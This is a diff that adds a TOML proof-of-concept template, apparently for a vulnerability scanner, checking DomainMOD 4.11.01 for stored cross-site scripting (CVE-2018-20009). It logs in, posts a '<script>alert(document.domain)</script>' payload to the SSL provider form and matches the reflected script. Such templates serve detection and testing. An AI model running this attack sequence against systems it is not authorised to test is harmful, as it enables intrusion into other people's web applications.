@@ -1,0 +1,68 @@
+[info]
+author = "AVE"
+description = "验证 DomainMOD 4.11.01 的 assets/add/ssl-provider.php 页面中 SSL Provider Name 字段是否存在存储型 XSS。需先登录，然后提交恶意脚本载荷，最后访问 ssl-providers.php 页面检查脚本是否被成功存储并反射。"
+id = "POC-AVE-2018-0159"
+name = "DomainMOD 4.11.01 SSL Provider 跨站脚本漏洞 PoC"
+severity = "medium"
+tags = [
+    "cve-2018-20009",
+    "domainmod",
+    "xss",
+    "authenticated",
+]
+vuln_id = [
+    "CVE-2018-20009",
+    "AVE-2018-0159",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = "new_username={{username}}&new_password={{password}}"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Dashboard"]
+
+[[poc.requests]]
+cookie_reuse = true
+method = "POST"
+path = "/{{BaseURL}}/assets/add/ssl-provider.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "new_ssl_provider=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&new_url=&new_notes="
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["SSL Provider"]
+
+[[poc.requests]]
+cookie_reuse = true
+method = "GET"
+path = "/{{BaseURL}}/assets/ssl-providers.php"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["><script>alert(document.domain)</script></a>"]
